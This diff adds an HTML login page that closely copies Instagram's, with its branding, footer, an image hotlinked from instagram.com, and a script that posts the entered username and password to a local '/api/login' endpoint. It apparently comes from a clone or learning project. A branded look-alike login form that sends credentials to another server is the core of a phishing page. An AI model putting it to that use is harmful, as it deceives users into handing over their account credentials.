@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* (Same CSS as before - omitted for brevity; copy from previous response) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .main-container { display: flex; max-width: 935px; width: 100%; justify-content: space-between; align-items: center; }
+        .left-side { flex: 1; display: flex; justify-content: center; max-width: 454px; }
+        .phone-image { width: 100%; height: auto; max-width: 454px; }
+        .right-side { flex: 1; display: flex; flex-direction: column; align-items: center; max-width: 350px; padding: 10px 0; }
+        .logo { font-size: 48px; font-family: 'Billabong', cursive; color: #262626; margin-bottom: 32px; text-decoration: none; }
+        .login-form { width: 100%; background: #fff; border: 1px solid #dbdbdb; border-radius: 4px; padding: 40px 40px 20px; text-align: center; }
+        .input-group { margin-bottom: 6px; position: relative; }
+        .input-group input { width: 100%; padding: 9px 0 7px 8px; border: 1px solid #efefef; border-radius: 3px; background: #fafafa; font-size: 12px; color: #262626; line-height: 15px; }
+        .input-group input:focus { border-color: #b2b2b2; outline: none; background: #fff; }
+        .input-group input::placeholder { color: #8e8e8e; font-size: 12px; }
+        .login-btn { width: 100%; background: #0095f6; border: none; border-radius: 5px; color: #fff; font-weight: 600; padding: 7px 0; margin: 8px 0 18px; font-size: 14px; cursor: pointer; transition: background 0.2s; }
+        .login-btn:hover { background: #1877f2; }
+        .login-btn:active { background: #166fe5; }
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #efefef; }
+        .divider span { margin: 0 18px; }
+        .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; margin: 20px 0; padding: 8px 0; }
+        .fb-login i { color: #385185; font-size: 18px; }
+        .fb-login:hover { text-decoration: underline; }
+        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 16px; display: inline-block; }
+        .forgot-password:hover { text-decoration: underline; }
+        .signup-link { color: #262626; font-size: 14px; text-decoration: none; margin-top: 32px; }
+        .signup-link strong { color: #0095f6; cursor: pointer; }
+        .signup-link strong:hover { text-decoration: underline; }
+        .footer { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); text-align: center; font-size: 12px; color: #8e8e8e; }
+        .footer a { color: #8e8e8e; text-decoration: none; margin: 0 5px; }
+        .footer a:hover { text-decoration: underline; }
+        .error-message, .success-message { font-size: 12px; margin-top: 10px; padding: 10px; border-radius: 3px; text-align: center; display: none; }
+        .error-message { background: #fdf2f2; color: #ed4956; border: 1px solid #ed4956; }
+        .success-message { background: #e7f3ff; color: #0095f6; border: 1px solid #0095f6; }
+        @media (max-width: 875px) { .main-container { flex-direction: column; margin-top: 20px; } .left-side { order: 2; margin-top: 30px; } .phone-image { display: none; } .right-side { order: 1; margin-bottom: 30px; } }
+        @media (max-width: 450px) { .login-form { padding: 20px 20px 10px; margin: 0 20px; } .logo { font-size: 36px; margin-bottom: 20px; } }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="left-side">
+            <img src="https://www.instagram.com/static/images/homepage/phones/homepage-phones.png/0da79f2b71a8.png" alt="Instagram App on Phone" class="phone-image">
+        </div>
+        <div class="right-side">
+            <a href="#" class="logo">Instagram</a>
+            <div class="login-form">
+                <form id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="loginInput" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-btn">Log in</button>
+                    <div id="loginMessage" class="error-message"></div> <!-- For errors/success -->
+                </form>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <div class="divider"><span>OR</span></div>
+                <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</a>
+                <p style="font-size: 14px; color: #8e8e8e; margin-top: 20px;">
+                    Don't have an account? <a href="signup.html" class="signup-link"><strong>Sign up</strong></a>
+                </p>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <a href="#">About</a> • <a href="#">Help</a> • <a href="#">Press</a> • <a href="#">API</a> • <a href="#">Jobs</a> • <a href="#">Privacy</a> • <a href="#">Terms</a> • <a href="#">Top Accounts</a> • <a href="#">Locations</a> • <a href="#">Instagram Lite</a> • <a href="#">Contact Uploading & Non-Users</a><br><strong>© 2023 Instagram from Meta</strong>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const identifier = document.getElementById('loginInput').value.trim();
+            const password = document.getElementById('password').value;
+            const messageDiv = document.getElementById('loginMessage');
+
+            messageDiv.style.display = 'none'; // Hide previous messages
+
+            try {
+                const response = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ identifier, password })
+                });
+                const data = await response.json();
+
+                if (data.success) {
+                    messageDiv.textContent = data.message;
+                    messageDiv.className = 'success-message';
+                    messageDiv.style.display = 'block';
+                    // Placeholder: Redirect to dashboard or store user in localStorage
+                    setTimeout(() => alert('Login successful! (In a real app, redirect to feed.)'), 1000);
+                } else {
+                    messageDiv.textContent = data.error;
+                    messageDiv.className = 'error-message';
+                    messageDiv.style.display = 'block';
+                }
+            } catch (err) {
+                messageDiv.textContent = 'Network error. Please try again.';
+                messageDiv.className = 'error-message';
+                messageDiv.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
